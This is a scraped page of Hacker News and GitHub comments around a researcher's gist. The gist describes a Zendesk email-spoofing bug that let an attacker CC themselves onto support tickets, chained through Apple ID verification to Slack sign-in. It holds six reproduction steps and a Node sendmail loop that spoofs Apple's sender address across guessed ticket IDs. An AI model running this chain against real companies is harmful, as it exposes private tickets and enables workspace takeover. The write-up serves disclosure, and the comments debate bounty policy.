Zendesk deserve a lot of flack here, especially after they already realized this is real. However, just to empathize a bit: the amount of spam SPF, DKIM, DMARC "security" reports anyone running a service gets is absolutely insane. So it's very easy to accidentally misclassify what this reporter originally discovered as that by accident. | | --- | --- | --- | | | |  |  | [chc4](user?id=chc4) [3 months ago](item?id=41819199)   | [prev](#41819426) | [next](#41819412) [–]  Years ago I had a similar train of thought: Zendesk is used by a ton of companies for their support site, and back then HTTPOnly cookies and javascript site isolation were much less of a thing. I found an XSS bug on Zendesk, which also translates into XSS on any site that used it as `support.fortune500.com` subdomain (which was a lot). You could then use it to exploit the main site, either by leaking user cookies or reading CSRF tokens from page contents because it was a subdomain. Zendesk gave me a tshirt but not any money for it.

Whatever that means. So for this to work still, you need to bypass a spam filter. They should just force DMARC and SPF like Google has done, and say "your fault if you misconfigure". Also default-off for the CC thing would be a good idea, too, with a warning of what could happen if they turn it on. Alternatively making a non-guessable id for the email. | | --- | --- | --- | | | |  |  | [vitus](user?id=vitus) [3 months ago](item?id=41819769)   | [parent](#41819412) | [next](#41820009) [–]  Hey, now you have to bypass two spam filters, and also email verification from Apple is now marked as likely-spam.

Since the attacker is now CC'ed they can read the entire history of the ticket including the legitimate email Apple sent in (1) containing the verification code. 4.

If this timeline is incorrect, Zendesk should immediately correct the record. As it stands, accusing the researcher of violating ethical principles looks very bad for Zendesk. Perhaps even libelous.

This is blatant dishonesty- the post documented in detail that the reward had already been denied, and the issue ignored multiple times before they contacted 3rd parties. That is not an ethical violation but an ethical necessity- after ZenDesk refused to act, they had an ethical responsibility to inform everyone affected. This alone is a huge red flag that ZenDesk isn't a trustworthy organization, on top of trying to hide rather than correct security issues unless they get bad press. If I were ZenDesk, I would pay out the bounty to this kid immediately, and release a detailed public apology explaining how the entire bounty review system has been revamped to take things like this much more seriously in the future. | | --- | --- | --- | | | |  |  | [integral\_1699](user?id=integral_1699) [89 days ago](item?id=41830914)   | [parent](#41822881) | [prev](#41824244) | [next](#41838557) [–]  Terrible response.

"SPF, DKIM, and DMARC issues" is absolutely and positively intended to mean "we don't care if we are missing these headers on our domains", in part because this is 99.9% of drive-by beg bounties (if you are tired of getting "I HAVE FOUND A SERIOUS SECURITY ISSUE IN YOUR WEBSITE" cc'ing security@, legal@, privacy@, and your CEO on a monthly cadence, just set up a DKIM record :P) Yes, this is technically a bug which is in the space of SPF, DKIM, and/or DMARC. But this is absolutely NOT WHAT THE EXCLUSION IS FOR. Hacker One triage teams should know better, and it's frankly embarrassing that they don't. And it's frankly mortifying that their mediation team also didn't pick up on this. But it checks out. This is one of the reasons I will not use Hacker One ever. Bugcrowd is slightly better.

Zen desk depends on a spam check for inbound email validity. This check does not appear to catch instances where sender email is spoofed. Zendesk claims this is bdue to DKIM/SPF/DMARC config but I have trouble imagining that 50% of Fortune 500 would get this wrong. There are many automated checks available. 3) Apple issues an Apple ID account to anyone who can receive a verification email Sent to the mailing address (support@company.com) 4) Slack allows you to sign in to a workspace using any Apple ID associated with the workspace domain (e.g. support@company.com) This researcher reported #2 to hackerone and was declined. Researcher later discovered full exploit with 3 and 4. Did not update hackerone, contacted affected companies directly. it would have been prudent to update hackerone on the additional finding, but it feels like an easy oversight for a 15 year old after getting rejected on the first round.

1 bug, $50,000+ in bounties, how Zendesk intentionally left a backdoor in hundreds of Fortune 500 companies

 [Raw](/hackermondev/68ec8ed145fcee49d2f5e2b9d2cf2e52/raw/550b979efc8e61e7ec47fdf0ee989d1ad750e7ca/zendesk.md)

[**zendesk.md**](#file-zendesk-md)

hi, i'm daniel. i'm a 15-year-old with some programming experience and i do a little bug hunting in my free time. here's the insane story of how I found a single bug that affected over half of all Fortune 500 companies:

## say hello to zendesk

If you've spent some time online, you’ve probably come across Zendesk.

Zendesk is a customer service tool used by some of the world’s top companies. It’s easy to set up: you link it to your company’s support email (like support@company.com), and Zendesk starts managing incoming emails and creating tickets. You can handle these tickets yourself or have a support team do it for you. Zendesk is a billion-dollar company, trusted by big names like Cloudflare.

Personally, I’ve always found it surprising that these massive companies, worth billions, rely on third-party tools like Zendesk instead of building their own in-house ticketing systems.

## your weakest link

As the saying goes, “You’re only as strong as your weakest link.” Since Zendesk is just seen as a basic ticketing tool, companies often set it up without much thought. The most common setup I've seen is is forwarding all emails from `support@company.com` to Zendesk.

Why is that dangerous? Many companies use their @company.com domain for Single Sign-On (SSO), which lets employees quickly log in to internal tools. By connecting Zendesk to the same domain, companies unknowingly create a potential security gap. Zendesk handles all emails for the domain it’s configured for, which means if your SSO system doesn’t properly validate email addresses, anyone who gains access to your Zendesk could potentially exploit this and access your internal systems. (I’ll explain more on this later.)

## email spoofing

At the beginning of the year, I discovered a serious vulnerability in Zendesk that allowed attackers to read customer support tickets from any company using Zendesk. All they had to do was sent a crafted email to a Support email handled by Zendesk. The shocking part? Zendesk didn’t seem to care.

The bug itself was surprisingly simple. Zendesk had no effective protection against email spoofing, and this oversight made it possible to exploit their email collaboration feature to gain access to others’ tickets.

Here’s how it worked: When you send an email to a company’s Zendesk support portal (e.g., `support@company.com`), Zendesk creates a new support ticket. To keep track of the email thread, Zendesk automatically generates a reply-to address, which looks like this: `support+id{id}@company.com`, where `{id}` is the unique ticket number. This address ensures that any future replies you send go directly to the same ticket.

Zendesk also has a feature for ticket collaboration. If you CC someone on one of your email replies, Zendesk automatically adds them to the ticket, allowing them to see the full ticket history in the support portal.

The exploit was simple: if an attacker knew the support email address and the ticket ID (which are usually easy to guess since ticket IDs are incremental), they could use email spoofing to impersonate the original sender. By sending a fake email to `support+id{id}@company.com` from the requestor’s email address and CCing their own email, Zendesk would think the email was legitimate. It would then add the attacker’s email to the ticket, giving them full access to the entire ticket history.

This meant an attacker could effectively join any ongoing support conversation, and read sensitive information—all because Zendesk didn’t have proper safeguards against email spoofing.

Bug Prerequisites:

* Requestor's email
* The ticket ID (since Zendesk ticket IDs are incremental, an attacker could brute-force or estimate it)
* Access to a public support portal

## "out of scope," said no attacker ever

As soon as I discovered this vulnerability, I reported it through Zendesk’s bug bounty program, fully expecting it to be taken seriously and fixed quickly. A week later, I was hit with a disappointing response:

Because my bug relied on email spoofing, which was considered "out of scope" for their HackerOne program, they rejected my report. It was unbelievable.

This response wasn’t even from an actual Zendesk team member. Many companies, like Zendesk, use a HackerOne service to triage reports so their own team can focus on fixing bugs instead of verifying submissions. Realizing this, I asked for the report to be forwarded to an actual Zendesk staff member for review. A few days later, I got another frustrating reply:

Zendesk refused to reconsider. Despite the security risk, they wouldn’t act on the report because it fell outside their program’s scope. Of course, they’d change their minds in a few weeks—but more on that later.

## escalating this to a full Slack takeover

I could have reported the email spoofing bug to individual companies that were affected by it, as it was possible to patch individual instances by disabling email collaboration, prevent attackers from adding themselves to tickets. But I wanted to make a bigger impact.

That's when I came across [TICKETTRICK](https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c), a blog post from 2017. In it, security researcher Inti De Ceukelaire detailed how he exploited Zendesk to infiltrate the private Slack workspaces of hundreds of companies. Since many companies use Slack SSO on the same domain as Zendesk, the researcher figured out he could complete email verifications through a `support@company.com` email, and gain access to private Slack channels. Back then, Zendesk wasn't as big and there were some bugs that allowed anyone to view your tickets if they had your email.

I realized that I could replicate his exploit using my bug, but with a few challenges to overcome.

### Enter OAuth

After his disclosure (this was years ago!), Slack changed their email verification system to include a random token in email addresses.

Inti's exploit (like mine) required the attacker to know the sending email address of the verification code. Slack added random tokens to their email addresses to combat similar attacks in the future. It was impossible to know what email they would send the verification email from (which is one of the prerequisites required for my exploit) as they generated a random token everytime. Unless...

While Slack used a random email token when sending email verification, neither Google or Apple did. Slack supported both methods for OAuth login.

It was the most simple bypass. Slack intoduced OAuth login just a few years ago and must have completely forgotten about their protections against this type of attacks.

So now the exploit was simple, create a Google account with a `support@company.com` email, request verification code, use my bug to access the ticket Zendesk automatically creates when it arrives, verify Google account, login with Google to Slack.

This was perfect...except it wouldn't work with Google. Google sent verification email from `noreply@google.com` and Zendesk had started blocking emails from `noreply@` addresses from being automatically created as tickets (probably after the TICKETTRICK disclosure too) which meant we wouldn't be able to recieve it.

Apple didn't do this though, Apple sent verification emails from `appleid@` address, jackpot.

## reproduction steps, apple -> zendesk -> slack

The steps to execute the attack now were simple:

1. Create an Apple account with `support@company.com` email and request a verification code, Apple sends verification code from `appleid@id.apple.com` to `support@company.com` and Zendesk automatically creates a ticket
2. At the same time, create a ticket on `company.com` support portal from my own email address, this allows me to keep track of a ID range
3. Use the email spoofing bug I mentioned earlier to attempt to add yourself to every ticket within the range from earlier

```
const sendmail = require('sendmail')();

// Assuming the ticket you created in step #2 was assigned a ticket ID of #453
// verification email landed somewhere near there
const range = [448, 457];
for (let i = range[0]; i < range[1]; i++) {
    // Send spoofed emails from Apple to Zendesk
    sendmail({
        from: 'appleid@id.apple.com',
        to: `support+id${i}@company.com`,
        cc: 'daniel@wearehackerone.com',
        subject: '',
        html: 'comment body',
    }, function (err, reply) {
        console.log(err && err.stack)
        console.dir(reply)
    });
};
```

4. Login to a company.com support portal (usually at support.company.com) from your account (`daniel@wearehackerone.com`) and view your CCed tickets.

5. Enter the verification code in Apple
6. Use Slack's "Login with Apple" feature and log in with the Apple account connected to company.com's email

I replicated this 6-step reproduction steps across hundreds of vulnerable Zendesk and Slack instances. After getting everything ready, I started individually reporting the bug to companies using Zendesk.

## aftermath

I spent about a week reporting the vulnerability to individual companies, some of them took immediate action and patched their instances, while others argued that it was a Zendesk issue. Then, something interesting happened—a comment appeared on my original HackerOne report:

I couldn’t help but find it amusing—they were now asking me to keep the report confidential, despite having initially dismissed it as out of scope.

Some companies must have contacted Zendesk after recieving my report and the pressure from this issue had essentially forced Zendesk’s hand. I hadn’t mentioned the Slack exploit in my original report to them because I hadn’t discovered it at that point, now they wanted full detailed reproduction steps for the Slack takeover.

I provided the proof of concept for the Slack vulnerability, and they confirmed the issue. Though they claimed they had "started working" on a fix, it would actually take them over two months to resolve it.

## bounties

Once companies vulnerable to this were alerted to the issue, many of them quickly disabled Zendesk’s email collaboration feature to protect their instances. Over the course of my reporting, I earned more than $50,000 in bounties from individual companies on HackerOne and other platforms.

Unsurprisingly, Zendesk didn’t come out of this looking good. At least one or two companies reportedly cut ties with Zendesk after my disclosure, canceling their agreements altogether.

## zendesk's fix (and my $0 bounty)

On July 2, 2024—two months after I submitted the report—Zendesk finally confirmed that they had fixed the issue. Here’s a statement from their Offensive Security Leader:

> In most cases, when an end user submits a support request by email, the email becomes a new ticket or adds a comment to an existing ticket. However, in certain cases, the email may be suspended. Suspending an email means putting it aside for further review. It's not necessarily spam. It's just not a ticket in Zendesk Support yet. It remains in limbo until somebody reviews it and decides whether to accept or reject it.
> We use two spam filters, Cloudmark and Rspamd EAP to help determine suspicious characteristics in messages. Depending on the score received by these tools, messages may be suspended. If you are curious, we publish a full list of causes for ticket suspension.
> In the attack scenario explained here, Cloudmark had very low spam scores of while RSpamD had very high spam scores; unfortunately we weren’t using the RSpamD score in this case, otherwise many of the emails would have been suspended and limited the ability to add CCs at all. The first fix we implemented was to Automatically switch to RSPAMD spam analysis when:
>
> 1. Our automatic ticket threading is triggered to thread an new email into a existing ticket and;
> 2. We haven’t previously suspended the message due to the Cloudmark score.
>    In addition to this, we also implemented filters to automatically suspend the following classes of emails:
>    User verification emails sent by Apple based on the Reply-To and Message-Id header values
>    Non-transactional emails from from googleworkspace-noreply@google.com
>    Over the coming months, we will continue to look into opportunities to strengthen our Sender Authentication functionality and provide customers with more gradual and advanced security controls over the types of emails that get suspended or rejected.

Despite fixing the issue, Zendesk ultimately chose not to award a bounty for my report. Their reasoning? I had broken HackerOne's disclosure guidelines by sharing the vulnerability with affected companies. I didn’t bother to argue :)

## conclusion

What started as a small email bug turned into an exploit that allowed me to infiltrate the internal systems of some of the world’s largest companies. While Zendesk eventually fixed the vulnerability, the journey to get there was a frustrating mix of rejections, slow responses, and ultimately no recognition for the report. But that’s the reality of bug hunting—sometimes you win, sometimes you don’t.

> The "vulnerability" is that some companies use the same email domain for external and internal users.

No, re-read the start of the article. The actual vulnerability has nothing to do with SSO, that was just a convenient high-profile way to leverage the vulnerability. The actual problem is that you can read the content of any issues if you can guess the easy-to-guess reply-to address. Having SSO services send emails to work-email domains to gain access was clever, but it’s a symptom of the vulnerability. Another possible attack is to steal PHI or other secrets from zendesk issues that were created by legitimate users. Another possible attack is to pretend to be the original customer who reported a real issue, hijacking their support thread, because zendesk trusts the content of the email.

All three of these possible attacks stem from the same root vulnerability. And zendesk can change their software *extremely easily* to prevent the attacks: just use a random email id instead of an easy-to-guess incrementing id in the reply address. That’s why it should be reported to them; they’re the ones who can fix it, quite easily (assuming minimal refactoring) and without dropping support for any of their features.

[@unknownfeature](https://github.com/unknownfeature) I am not sure if you simply aim to prove you can debate over anything, or if you just have a poor understanding of the situation, but either way you are making a fool out of yourself. I just want to address this comment of yours:

> In the end I would like to add that if something is out of scope it should not be tested. If the program doesn't accept some types of vulns I would never submit those and would not demand money. Scope has to be respected by everyone. Together with ethical principles. You folks created a hype of this questionable event. And you don't understand what's the issue is about. You comment speaks for itself. Very upsetting that new generation lacks critical thinking. Do better!

I would suggest you read carefully Zendesk's program guidelines here: <https://hackerone.com/zendesk?type=team>

Issues related to SPF, DKIM, DMARC are not "out of scope", just not eligible for a bounty themselves. There is a separate chapter for testing exclusions and those issues are not listed. This means that testing for SPF, DKIM, DMARC issues is permitted and you can use them as gadgets, chain them, prove bigger impact etc.

This is where H1 failed expectations, closing a valid bug without considering the overall impact, even without properly interpreting the policy.

Zendesk also encourages you to "Share the details of any suspected vulnerabilities with the Zendesk Security Team by filing a report". They were also happy to work with the reporter in the end, to ask for more details, but not to pay for the reporter's work. In BB culture, this is considered a d!ck move.

There are two issues

Being out of scope for the bounty program - Whether it is entitled to a bounty is irrelevant. If it was in scope, would they send you the bounty and then ignore it?

There was a bug on LinkedIn (before Microsoft bought it) -- There was a list of symbols on the profile page indicating the groups you were interested in. There was also a button allowing you to reorder the groups. The section for reordering crashed a lot and there were massive lists of complaints on the LinkedIn forums, the FaceBook forums, and a host of others. I looked at the HTML and JavaScript for the page and found the problem. The page had used two SQL statements. One used an inner join while the other used an outer join. If they had both used the same type of join, it would have worked. I notified them of the issue and received the following response: "We are aware of the problem and have given it top priority. When we find more information, we will inform you." I phoned the help desk and walked her through the steps to resolve the issue for my account. I could then reorder that part of the page for my account. I resent the bug report and received the same reply. I asked her to reread my request and she apologized profusely but indicated that the next level help desk would not look at messages from her.

In another case, a programmer at my company was having problems talking to the help desk because he said it was round-off error. I worked out an example that clearly showed it was not round-off. It was a problem with Java with classic "call by value" versus "call by reference". It was a one line change and he had the decency to be chagrined.

At one more location, the management purchased millions of dollars of laser printers although there were no printer drivers available. The output was unusable. A manager told me that he had told everyone that I was giving it top priority, but that I wasn't to do any work on it. To avoid being the scapegoat and because the programmers using the laser printers for program listings were reallly hurting, I fixed it. It took under a week.

These problems and a number of others were several years ago before I retired. If the white house wants to fight bug, maybe they should give us a place to send them

> The vulnerability was not “email spoofing exists”, it was “your app is completely trusting email addresses”.

Exactly, that was my point, it's not about SPF,DKIM,DMARC,... vulnerability, you can send them trivially spoofed email in the classic 90s way, if I'm reading the OP correctly. That's ridiculous (on the zendesk side, just clarifying in case somebody is confused by my wording again).

And their heuristic spam-filter "fix" is ridiculous as well, at least they should add hard-coded rules tuned to remove all confirmation code emails on their side, not depending on 3rd party filtering rules in such blatantly obvious cases (and I would expect some kind of `sed` filters masking out any potential secret keys/codes in ticket texts as well, as tickets shouldn't be used to pass sensitive information between reporter and developer, definitely not as plaintext - in ideal world).

> > schmorp
>
> So what's the bug zendesk suffers from? Also if the other systems didn't have any issues why did the OP have to use slack and apple id? Can you explain this?

The bug is that it enable anybody to add a CC: address simply by guessing the ZendDesk ticket ID that is a sequential number.

It leads to a breach of privacy and trust: anybody can now `subscribe` to every ZenDesk ticket out there. This is bad in and by itself. Bad for business and most certainly illegal in lots of countries.

=> [@ZendeskTeam](https://github.com/ZendeskTeam) should not have ignored this initial discovery and work hard to fix this!

Now the exploit is using this vulnerability to now attack slack via various problems associates with OAuth flows.

=> The researcher used his knowledge of verifications flows and SSO to effectively bypass the slack protection flows.

=> The root cause of the exploit is really the first one. Without Zendesk an attacker can not create a random @company.com email with google/apple and get it validated.

=> The next step is to gain access to all the SSO protected systems this company owns (including slack as an example)

Interesting blanket statement `none of you is looking for the truth` also implying that you are looking for the truth...

At the end of the day, this is a moral argument: how [@ZendeskTeam](https://github.com/ZendeskTeam) dealt with the researcher is bad and the blog posted is also bad in term of morals.

I get it that it is not fun to learn that your product can be used to super easily hack various of your customers' systems.

As a leader, you should not shoot the messenger. Ideally, you should even go over your bruised ego and thank the researcher for its findings. Given Zendesk size saying thank you implies a reward.

What [@ZendeskTeam](https://github.com/ZendeskTeam) is especially amoral given the impact of the finding for Zendesk customers...

Zendesk is clearly the weakest link in this situation. It seems you may not have a full understanding of the issue at hand. If Zendesk doesn’t provide a solution, it would mean that any organization using the same email SSO for both Zendesk and Slack would face restrictions. The only way to resolve this is for Zendesk to provide a fix, as it’s not within Slack’s or any other service control.

By the way, if you haven't read the article, they actually explain how this is their own issue. Really, you should try to stop arguing with everyone without a good statement.

> "Maybe a problem that it is allowed to user with \*apple.com domain to create tickets? So maybe whoever configured it this way is responsible for this issue? Especially taking into account that zendesk recommends to use subdomains. Maybe slack is responsible for creating tickets from such users? Maybe apple is responsible for sending emails the way that allows the tickets to be created from the id address?"

Exactly, this suggests that Zendesk is the root of the issue. They already block noreply emails, but it seems they overlooked this configuration where other services don't use those, and it went unnoticed until now.

geniunely not sure why everyone is tweaking about this...

its a **zendesk** issue. the reason he was able to gain access to slack, create an apple id with that email, etc was because he took advantage of a **zendesk** bug. if **zendesk** did not have that bug, he wouldn't have been able to get access.

zendesk and hackerone are both in the wrong here. hackerone triagers basically brushed over the bug report (as they always do) and ignored the main part of the vulnerability. it is email spoofing, but not in the way described in the out-of-scope section. zendesk, however, should have taken note and stepped in. it is their responsibility to keep their customers safe, and the best way to get this resolved before anything more major happened was to have someone use it as a POC on live customers. if this never happened, god knows who may have abused this bug...

tbh, i think this is a lesson for both parties involved:

* zendesk - you need to revamp your bug bounty program and actually listen to reporters, as this could have all been avoided if you just took the time to actually read what [@hackermondev](https://github.com/hackermondev) reported.
* hackerone - you need to teach your triagers and mediators to actually read and handle reports properly. anyone that has reported through h1 before knows how hard it is to get across to your team and it takes many weeks of the bug existing before the issue is triaged.

You could additionally convert the screenshots to text, if only for accessibility reasons.

<https://support.zendesk.com/hc/en-us/community/posts/5516621249690-Phishing-Warning-for-other-Admins> seems like social engineering doesn't necessarily even require you to spoof the From header and risk tripping over any DMARC checks, because zendesk uses the reply-to address to set the ticket requester. Seems like there is only a small warning in the footer if it doesn't match with the From address, but it doesn't go into the suspended tickets - at least back in March 2023 at the time of that thread?

> The email body is not used in any way to assist in identifying the requester of a ticket. Zendesk uses information from the email headers to determine the ticket requester. Usually a requester is set based on the reply-to: header flag. If the reply-to: header is not present, from: is used in its place. This behavior can't be changed.

I hope they haven't also used the reply-to header for the cc feature, because I doubt any DMARC policy checks even apply there?

This is a great example of why "out-of-scope" should always be seriously considered as a valid submission.

Just wanted to add another "great job, great write-up!" for [@hackermondev](https://github.com/hackermondev) and "zendesk sucks, you should be ashamed" for [@ZendeskTeam](https://github.com/ZendeskTeam). Def won't ever use Zendesk again.

It is interesting to see how a major company responds to an initial security report, even though when it falls outside their policy on H1. One can only consider the potential consequences if a malicious actor had exploited this vulnerability because it was not escalated, solely due to the absence of a bounty. Such an outcome could have posed a significantly greater risk for Zendesk and other big fortune 500's.

Nonetheless, awesome work on your findings!

official statement from Zendesk on this topic:

<https://support.zendesk.com/hc/en-us/articles/8187090244506-Email-user-verification-bug-bounty-report-retrospective>

community retrospective: a bug outside of scope and without payment is perfectly fine to be reported to other companies.

'bug' was reported as informative - but Zendesk still acted and 'patched' it after complaints.
